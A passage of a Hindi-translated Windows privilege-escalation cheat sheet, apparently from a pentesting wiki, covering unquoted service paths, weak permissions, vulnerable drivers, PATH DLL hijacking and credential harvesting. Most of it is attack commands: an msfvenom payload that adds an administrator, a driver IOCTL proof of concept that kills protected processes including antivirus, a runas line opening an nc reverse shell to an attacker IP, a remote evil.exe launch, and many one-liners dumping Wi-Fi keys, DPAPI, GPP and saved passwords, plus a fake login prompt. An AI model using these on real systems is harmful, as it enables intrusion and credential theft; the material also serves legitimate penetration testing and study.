Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप इस vulnerability को metasploit के साथ detect और exploit कर सकते हैं:** `exploit/windows/local/trusted\_service\_path` आप metasploit के साथ मैन्युअली एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### रिकवरी क्रियाएँ

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service असफल हो तो कौन सी क्रियाएँ की जानी चाहिए। इस सुविधा को किसी binary की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि इस binary को बदला जा सके, तो privilege escalation संभव हो सकता है। अधिक विवरण [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकते हैं।

## एप्लिकेशन

### इंस्टॉल किए गए एप्लिकेशन

जाँचें **बाइनरीज़ की permissions** (शायद आप किसी एक को overwrite कर के privilege escalation कर सकें) और **फ़ोल्डरों** की भी ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमतियाँ

जाँच करें कि क्या आप किसी config फ़ाइल को संशोधित कर सकते हैं ताकि किसी विशेष फ़ाइल को पढ़ा जा सके, या क्या आप किसी बाइनरी को संशोधित कर सकते हैं जिसे Administrator account (schedtasks) द्वारा चलाया जाएगा।

सिस्टम में कमजोर फ़ोल्डर/फ़ाइल अनुमतियाँ खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाना

**जाँचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जो किसी अन्य user द्वारा executed होगा।**\
**पढ़ें** यह **निम्नलिखित पृष्ठ** ताकि आप दिलचस्प **autoruns locations to escalate privileges** के बारे में और जान सकें:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई ड्राइवर arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers) एक्सपोज़ करता है, तो आप kernel memory से सीधे SYSTEM token चुरा कर escalate कर सकते हैं। पूरा step‑by‑step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

ऐसी race-condition बग्स के लिए जहाँ vulnerable call attacker-controlled Object Manager path खोलता है, lookup को जानबूझकर धीमा करने (max-length components या deep directory chains का उपयोग करके) window को microseconds से लेकर tens of microseconds तक बढ़ाया जा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities आपको deterministic layouts groom करने, writable HKLM/HKU descendants का दुरुपयोग करने, और metadata corruption को kernel paged-pool overflows में बदलने की अनुमति देती हैं बिना किसी custom driver के। पूरा chain यहाँ देखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपने device object को IoCreateDeviceSecure के माध्यम से मजबूत SDDL के साथ बनाते हैं लेकिन DeviceCharacteristics में FILE_DEVICE_SECURE_OPEN सेट करना भूल जाते हैं। इस flag के बिना, secure DACL उस समय लागू नहीं होता जब device को extra component वाले path के माध्यम से खोला जाता है, जिससे कोई भी unprivileged user निम्नलिखित namespace path का उपयोग करके handle प्राप्त कर सकता है:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

एक बार user device खोल सके, driver द्वारा expose किए गए privileged IOCTLs का दुरुपयोग LPE और tampering के लिए किया जा सकता है। वाइल्ड में देखी गई उदाहरण क्षमताएँ:
- किसी भी arbitrary processes को full-access handles वापस करना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- किसी भी arbitrary processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) भी शामिल है, जिससे user land से kernel के माध्यम से AV/EDR को kill करने की अनुमति मिलती है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए निवारक उपाय
- जब आप ऐसे device objects बना रहे हों जिन्हें DACL द्वारा प्रतिबंधित किया जाना है, तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- प्रिविलेज्ड ऑपरेशन्स के लिए कॉलर के context को वैलिडेट करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित रखें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

रक्षा टीम के लिए डिटेक्शन सुझाव
- संदिग्ध device names (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग सूचक specific IOCTL sequences की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) को लागू करें और अपनी खुद की allow/deny lists बनाए रखें।

## PATH DLL Hijacking

यदि आपके पास PATH पर मौजूद किसी फ़ोल्डर के भीतर **write permissions** हैं, तो आप किसी process द्वारा loaded DLL को hijack कर सकते हैं और **escalate privileges** कर सकते हैं।

PATH के अंदर सभी फ़ोल्डरों की अनुमतियाँ जांचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस चेक का दुरुपयोग कैसे किया जाए, इसके बारे में अधिक जानकारी के लिए:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file पर hardcoded किए गए अन्य ज्ञात कंप्यूटरों की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस और DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहरी से **प्रतिबंधित सेवाओं** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Table
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करना, नियम बनाना, बंद करना, बंद करना...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user प्राप्त कर लेते हैं तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी port पर listen करने के लिए करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा अनुमति दी जानी चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को आसानी से root के रूप में शुरू करने के लिए, आप `--default-user root` आज़माकर देख सकते हैं

आप `WSL` फाइल सिस्टम को इस फ़ोल्डर में एक्सप्लोर कर सकते हैं: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
The Windows Vault सर्वरों, वेबसाइटों और अन्य प्रोग्रामों के लिए उपयोगकर्ता credentials संग्रहीत करता है जिन्हें **Windows** उपयोगकर्ताओं को **स्वचालित रूप से लॉग इन करवा सकता है**। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि यहाँ स्टोर कर सकते हैं, ताकि वे ब्राउज़रों के जरिए स्वचालित रूप से लॉग इन हो जाएँ। पर ऐसा नहीं है।

Windows Vault उन credentials को स्टोर करता है जिन्हें Windows स्वचालित रूप से लॉग इन करने में उपयोग कर सकता है, जिसका अर्थ है कि कोई भी **Windows application that needs credentials to access a resource** (server या website) **can make use of this Credential Manager** और Windows Vault का उपयोग कर सकता है और प्रदान किए गए credentials का इस्तेमाल कर सकता है, ताकि उपयोगकर्ता बार-बार username और password न भरें।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए credentials का उपयोग कर पाएंगी। इसलिए, अगर आपकी application vault का उपयोग करना चाहती है, तो उसे किसी न किसी तरह से **communicate with the credential manager and request the credentials for that resource** करके default storage vault से credentials माँगनी चाहिए।

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्न उदाहरण एक रिमोट binary को SMB share के माध्यम से कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas` का उपयोग प्रदान किए गए credential के साथ।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

The **Data Protection API (DPAPI)** डेटा के सममित एन्क्रिप्शन के लिए एक विधि प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम के भीतर असममित निजी कुंजियों के सममित एन्क्रिप्शन के लिए उपयोग होता है। यह एन्क्रिप्शन एंट्रॉपी में महत्वपूर्ण योगदान देने के लिए एक उपयोगकर्ता या सिस्टम सीक्रेट का उपयोग करता है।

**DPAPI उपयोगकर्ता के लॉगिन सीक्रेट्स से व्युत्पन्न सममित कुंजी के माध्यम से कुंजियों के एन्क्रिप्शन को सक्षम करता है**। सिस्टम एन्क्रिप्शन से संबंधित परिदृश्यों में, यह सिस्टम के डोमेन प्रमाणीकरण रहस्यों का उपयोग करता है।

DPAPI का उपयोग करके एन्क्रिप्ट किए गए उपयोगकर्ता RSA कुंजी `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होते हैं, जहां `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI कुंजी, जो उसी फ़ाइल में उपयोगकर्ता की निजी कुंजियों की रक्षा करने वाले मास्टर कुंजी के साथ सह-स्थित रहती है**, सामान्यतः 64 bytes का रैंडम डेटा होती है। (ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, इसलिए इसकी सामग्री को CMD में `dir` कमांड से सूचीबद्ध नहीं किया जा सकता, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त आर्ग्यूमेंट्स (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर स्थित होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप **mimikatz module** `dpapi::cred` का उपयोग उपयुक्त `/masterkey` के साथ decrypt करने के लिए कर सकते हैं.\\

आप **extract many DPAPI** **masterkeys** को **memory** से `sekurlsa::dpapi` module (यदि आप root हैं) के साथ निकाल सकते हैं.


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और automation tasks के लिए सुविधाजनक तरीके से encrypted credentials को स्टोर करने हेतु उपयोग किए जाते हैं। ये credentials **DPAPI** का उपयोग करके protected होते हैं, जिसका आमतौर पर अर्थ है कि इन्हें केवल उसी user द्वारा उसी computer पर decrypted किया जा सकता है जिस पर इन्हें बनाया गया था।

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

आप उन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं

### Recently Run Commands

हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **किसी भी .rdg फ़ाइलों को डिक्रिप्ट करें**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

लोग अक्सर Windows वर्कस्टेशनों पर StickyNotes ऐप का उपयोग **पासवर्ड सहेजने** और अन्य जानकारी के लिए करते हैं, यह महसूस किए बिना कि यह एक डेटाबेस फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित है और इसे हमेशा खोजने और जांचने लायक माना जाना चाहिए।

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** कॉन्फ़िगर किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है .\
इंस्टॉलर्स **run with SYSTEM privileges**, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फाइलें और Registry (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH होस्ट कुंजियाँ
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys `HKCU\Software\OpenSSH\Agent\Keys` नामक registry key के अंदर स्टोर हो सकते हैं, इसलिए आपको यह जांचना चाहिए कि वहां कुछ दिलचस्प है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस पथ के भीतर कोई एंट्री पाते हैं तो वह संभवतः एक सहेजी हुई SSH key होगी। यह encrypted रूप में संग्रहीत होती है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके decrypted किया जा सकता है.\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रहा है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh के माध्यम से किसी मशीन में login करने की कोशिश की। रजिस्ट्रि HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।  
>
### बिना निगरानी वाली फाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

एक फ़ाइल खोजें जिसका नाम **SiteList.xml** हो

### Cached GPP पासवर्ड

पहले एक फीचर उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से कई मशीनों पर custom local administrator accounts तैनात करने की अनुमति देता था। हालांकि, इस विधि में महत्वपूर्ण सुरक्षा कमजोरियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में संग्रहीत होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरी बात, इन GPPs में पासवर्ड, जो AES256 से encrypted होते थे और एक publicly documented default key का उपयोग करते थे, किसी भी authenticated user द्वारा decrypted किए जा सकते थे। यह एक गंभीर जोखिम पैदा करता था, क्योंकि इससे उपयोगकर्ताओं को elevated privileges प्राप्त हो सकते थे।

इस जोखिम को कम करने के लिए, एक function विकसित किया गया जो स्थानीय रूप से cached GPP फ़ाइलों के लिए स्कैन करता है जिनमें एक "cpassword" field होता है जो खाली नहीं होता। ऐसी फ़ाइल मिलने पर, function पासवर्ड को decrypt करता है और एक custom PowerShell object लौटाता है। यह object GPP और फ़ाइल के स्थान के बारे में विवरण शामिल करता है, जो इस सुरक्षा कमजोरी की पहचान और remediation में मदद करता है।

इन फ़ाइलों के लिए `C:\ProgramData\Microsoft\Group Policy\history` या _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista से पहले)_ में खोजें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
पासवर्ड प्राप्त करने के लिए crackmapexec का उपयोग:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS वेब कॉन्फ़िग
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### लॉग्स
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **उपयोगकर्ता से उसके credentials दर्ज करने के लिए या यहां तक कि किसी अन्य उपयोगकर्ता के credentials भी दर्ज करने के लिए कह सकते हैं** यदि आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि क्लाइंट से सीधे **credentials** के लिए **पूछना** वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभव फ़ाइल नाम जिनमें credentials हो सकते हैं**

